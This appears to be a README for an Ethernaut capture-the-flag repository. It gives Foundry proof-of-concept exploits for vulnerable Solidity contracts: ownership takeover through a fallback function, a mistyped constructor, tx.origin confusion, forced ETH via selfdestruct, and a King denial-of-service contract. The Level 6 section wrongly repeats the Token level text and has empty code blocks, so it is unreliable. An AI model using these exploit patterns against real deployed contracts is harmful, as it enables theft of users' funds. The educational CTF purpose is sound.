# 🔓 Ethernaut CTF - Foundry Edition

A comprehensive collection of **Ethernaut security challenges** implemented and solved using **Foundry** (Solidity testing framework). This repository contains vulnerable smart contracts and their proof-of-concept (POC) exploits.

---

## 📚 Table of Contents

1. [Level 1: Fallback](#level-1-fallback)
2. [Level 2: Fallout](#level-2-fallout)
3. [Level 3: Coin Flip](#level-3-coin-flip)
4. [Level 4: Telephone](#level-4-telephone)
5. [Level 5: Token](#level-5-token)
6. [Level 6: Delegation](#level-6-delegation)
7. [Level 7: Force](#level-7-force)
8. [Level 8: Vault](#level-8-vault)
9. [Level 9: King](#level-9-king)
10. [Level 10: Re-entrancy](#level-10-re-entrancy)
11. [Level 11: Elevator](#level-11-elevator)
12. [Level 12: Privacy](#level-12-privacy)
13. [Level 13: Gatekeeper One](#level-13-gatekeeper-one)
14. [Level 14: Gatekeeper Two](#level-14-gatekeeper-two)
15. [Level 15: Naught Coin](#level-15-naught-coin)

---

## Level 1: Fallback
> **Objective:** Claim ownership of the contract and reduce its balance to 0.

**Challenge Files:**
- [Vulnerable Contract](/src/Fallback/Fallback.sol)

**Vulnerability:** Fallback function can be used to claim ownership by contributing and sending funds directly.

**POC - Test Contract:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test,console} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback/Fallback.sol";

contract FallbackTest is Test {

    Fallback fallbackContract;
    address public constant ATTACKER = address(0xB0B);
    address owner = msg.sender;

    function setUp() public {
        fallbackContract = new Fallback();
        vm.deal(ATTACKER, 1 ether);
    }

    function test_1() public {
        //set
        for (uint i = 0; i < 100; i++) {
            address addr = address(uint160(i + 1));
            vm.deal(addr, 1 ether);
            vm.prank(addr);
            fallbackContract.contribute{value: 0.0009 ether}();
        }
        console.log("Balance Before Attack", address(fallbackContract).balance);
        

        //attack
        vm.startPrank(ATTACKER);
        fallbackContract.contribute{value: 0.0001 ether}();
        payable(address(fallbackContract)).call{value: 0.0001 ether}(""); // by sending eth direct to contract, sender becomes owner
        fallbackContract.withdraw();
        vm.stopPrank();

        assertEq(address(fallbackContract).balance, 0);
        assert(ATTACKER == fallbackContract.owner());
        console.log("Balance After Attack", address(ATTACKER).balance);
        
    }        
}
```

**Key Insights:**
- Fallback functions execute when no function selector matches
- Direct ETH transfers bypass function signatures
- Proper access control is essential for sensitive operations

---

## Level 2: Fallout
> **Objective:** Claim ownership of the contract.

**Challenge Files:**
- [Vulnerable Contract](/src/Fallout/Fallout.sol)

**Vulnerability:** Constructor named `Fal1out` instead of `Fallout` - can be called by anyone!

**POC - Test Contract:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test,console} from "forge-std/Test.sol";
import {Fallout} from "../src/Fallout/Fallout.sol";

contract FalloutTest is Test {

    Fallout fallout;
    address attacker = address(0xB0B);

    function setUp() public {
        fallout = new Fallout();
        vm.deal(attacker, 1 ether);
    }

    function test_owner() public {

        for (uint i = 0; i < 100; i++) {
            address addr = address(uint160(i + 1));
            vm.deal(addr, 1 ether);
            vm.prank(addr);
            fallout.allocate{value: 0.0009 ether}();
        }

        console.log("Balance Before Attack: ", address(fallout).balance);
        console.log("Owner: ", fallout.owner());

        vm.startPrank(attacker);
        fallout.Fal1out{value: 0.0009 ether}();
        fallout.collectAllocations();
        vm.stopPrank();

        assertEq(fallout.owner(), attacker);
        console.log("Balance After Attack: ", address(fallout).balance);
        console.log("New Owner Balance: ", address(fallout.owner()).balance);
        assert(address(fallout).balance == 0);

    }

}
```

**Key Insights:**
- Typos in constructor names bypass initialization logic
- Be extremely careful with function naming in Solidity
- Always use compiler warnings to catch unintended behavior
---

## Level 3: Coin Flip

> **Objective:** Predict coin flip outcomes to win 10 consecutive times.

**Challenge Files:**
- [Vulnerable Contract](/src/Coin/Coin.sol)

**Vulnerability:** Randomness derived from `blockhash()` - predictable and can be manipulated.

**POC:** *(To be documented)*

---

## Level 4: Telephone
> **Objective:** Claim ownership of the contract.

**Challenge Files:**
- [Vulnerable Contract](/src/Telephone/Telephone.sol)

**Vulnerability:** `tx.origin` vs `msg.sender` confusion - attacker can call through intermediary contract.

**POC - Test Contract:**
```solidity
pragma solidity ^0.8.0;

import {Test,console} from "forge-std/Test.sol";
import {Telephone} from "../src/Telephone/Telephone.sol";

contract TelephoneTest is Test {
    Telephone telephone;
    Exploit exploit;
    
    function setUp() public {
        telephone = new Telephone();
        exploit = new Exploit(address(telephone));
    }

    function test_attack() public {
        address attacker = address(0xB0B);
        vm.startPrank(attacker);
        exploit.attack();
        vm.stopPrank();

        assertEq(telephone.owner(), attacker);
        console.log("Attack Successful, new owner is:", telephone.owner());
    }
}

contract Exploit {
    Telephone telephone;

    constructor(address _telephoneAddress) {
        telephone = Telephone(_telephoneAddress);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}
```

**Key Insights:**
- `tx.origin` = original transaction sender (can be EOA or contract)
- `msg.sender` = immediate caller (contract address when called via intermediary)
- Always use `msg.sender` for access control checks
---

## Level 5: Token

> **Objective:** Get additional tokens beyond the initial 20 tokens.

**Challenge Files:**
- [Vulnerable Contract](/src/Token/Token.sol)

**Vulnerability:** Integer underflow in transfer function (pre-Solidity 0.8 without SafeMath).

**POC:** *(To be documented)*

---

## Level 6: Delegation
> **You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.**
- **[CODE](/src/Token/Token.sol)**
- **POC**
```javascript

```
> **You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.**
- **[CODE](/src/Token/Token.sol)**
- **POC**
```solidity

```

---

## Level 7: Force
> **Objective:** Make the balance of the Force contract greater than zero.

**Challenge Files:**
- [Vulnerable Contract](/src/Force/Force.sol)

**Vulnerability:** `selfdestruct()` bypasses contract receive/fallback - forces ETH transfer.

**POC - Test Contract:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Force} from "../src/Force/Force.sol";
import {Test, console} from "forge-std/Test.sol";

contract ForceTest is Test {
    Force force;

    function setUp() public {
        force = new Force();
    }

    function test_Force() public {
        console.log("Balance before exploit:", address(force).balance);
        vm.deal(address(this), 1 ether);
        Exploit exploit = new Exploit{value: 1 ether}(payable(address(force)));

        // Force contract should have received Ether
        console.log("Balance after exploit:", address(force).balance);
        assert(address(force).balance > 0);
    }
}

contract Exploit {
    constructor(address payable _target) payable {
        selfdestruct(_target);
        // selfdestruct sends all Ether in this contract to the target address forcefully
    }
}
```

**Key Insights:**
- `selfdestruct()` forces ETH transfer even without payable functions
- No receive/fallback can prevent `selfdestruct` transfers
- Modern Solidity (0.8.18+) deprecates `selfdestruct` for security
---

## Level 8: Vault

> **Objective:** Unlock the vault.

**Challenge Files:**
- [Vulnerable Contract](/src/Vault/Vault.sol)

**Vulnerability:** Private variables are not hidden - readable from blockchain state.

**POC:** *(To be documented)*

---

## Level 9: King
> **Objective:** Become king and prevent others from claiming kingship.

**Challenge Files:**
- [Vulnerable Contract](/src/King/King.sol)

**Vulnerability:** Can trap kingship by rejecting ETH transfers with a contract that reverts on receive.

**POC - Test Contract:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "../src/King/King.sol";
import {Test, console} from "forge-std/Test.sol";

contract TestKing is Test {
    King _king;
    
    function setUp() public {
        _king = new King();
    }

    fallback() external payable {}

    function test_attack() public {
        address user1 = address(0x123);
        address user2 = address(0x124);
        vm.deal(user1, 10 ether);
        vm.deal(user2, 10 ether);

        vm.prank(user1);
        (bool success, ) = address(_king).call{value: 1 ether}("");

        console.log("user1 is king: ", _king._king() == user1);

        Attacker attacker = new Attacker{value: 1 ether}(_king);
        console.log("Attacker is New king: ", _king._king() == address(attacker));

        vm.prank(user2);
        (success, ) = address(_king).call{value: 2 ether}("");
        console.log("user2 is New king: ", _king._king() == user2);

        if (!(_king._king() == user2)) {
            console.log("Hacked successfully, Attacker is the King forever");
        } 
    }
}

contract Attacker {
    constructor(King _King) payable {
        (bool result,) = address(_King).call{value: msg.value}("");  
    }
    
    receive() external payable {
        revert("King is trapped!");
    }
}
```

**Key Insights:**
- Contracts can reject ETH transfers via `receive()` revert
- Denying fund transfers can trap critical state
- Always handle failed transfers gracefully
---

## Level 10: Re-entrancy

> **Objective:** Steal all funds from the contract using reentrancy.

**Challenge Files:**
- [Vulnerable Contract](/src/Re-entrancy/Re-entrancy.sol)

**Vulnerability:** Withdrawal logic vulnerable to reentrancy attack - balance updated after transfer.

**POC:** *(To be documented)*

---

## Level 11: Elevator

> **Challenge Files:**
- [Vulnerable Contract](/src/Elevator/Elevator.sol)

**Vulnerability:** *(To be documented)*

---

## Level 12: Privacy

> **Challenge Files:**
- [Vulnerable Contract](/src/Privacy/Privacy.sol)

**Vulnerability:** Private storage variables can be read from blockchain state.

---

## Level 13: Gatekeeper One

> **Challenge Files:**
- [Vulnerable Contract](/src/Gatekepper\ One/Gatekepper.sol)

**Vulnerability:** Gate checks can be bypassed with proper address encoding.

---

## Level 14: Gatekeeper Two

> **Challenge Files:**
- [Vulnerable Contract](/src/Gatekepper\ Two/Gatekepper.sol)

**Vulnerability:** *(To be documented)*

---

## Level 15: Naught Coin

> **Challenge Files:**
- [Vulnerable Contract](/src/Naught\ Coin/NaughtCoin.sol)

**Vulnerability:** Approving tokens allows third parties to transfer on behalf of owner.

---

## 🛠️ Setup & Usage

### Prerequisites
- [Foundry](https://book.getfoundry.sh/) installed
- Solidity knowledge

### Installation
```bash
git clone <this-repo>
cd EthernautCTF-Foundry
forge install
```

### Running Tests
```bash
# Run all tests
forge test

# Run specific level
forge test --match-path "**/Fallback*"

# Verbose output
forge test -vv
```

### Building
```bash
forge build
```

---

## 📚 Learning Resources

- [Ethernaut Official](https://ethernaut.openzeppelin.com/)
- [Solidity Documentation](https://docs.soliditylang.org/)
- [OpenZeppelin Contracts](https://github.com/OpenZeppelin/openzeppelin-contracts)
- [Foundry Book](https://book.getfoundry.sh/)

---

## ⚠️ Disclaimer

This repository is for **educational purposes only**. These are intentionally vulnerable smart contracts. Never use these patterns in production code.

---

## 📄 License

MIT License



<!-- sk_e09870dabdc7e8a7e29d60d1185f161f6377e6d973e442e9e544c08bf4610c72 -->